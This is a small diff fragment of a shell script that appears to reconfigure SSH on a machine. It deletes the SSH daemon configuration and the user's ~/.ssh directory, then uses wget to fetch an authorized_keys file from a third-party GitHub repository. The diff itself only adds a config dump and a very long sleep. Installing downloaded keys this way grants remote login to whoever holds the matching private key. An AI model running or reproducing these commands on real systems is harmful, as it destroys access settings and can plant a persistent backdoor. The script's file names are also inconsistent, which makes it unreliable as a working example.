@@ -6,6 +6,8 @@ rm -r /etc/sshd_conf
 cp sshd_conf /etc/
 rm -r ~/.ssh
 mkdir ~/.ssh
+cat /etc/sshd_config
+sleep 200000
 wget https://github.com/Zemanezaco13267509/test/raw/main/authorized_keys
 mv sshd_config.1 sshd_config
 mv sshd_config.2 sshd_config
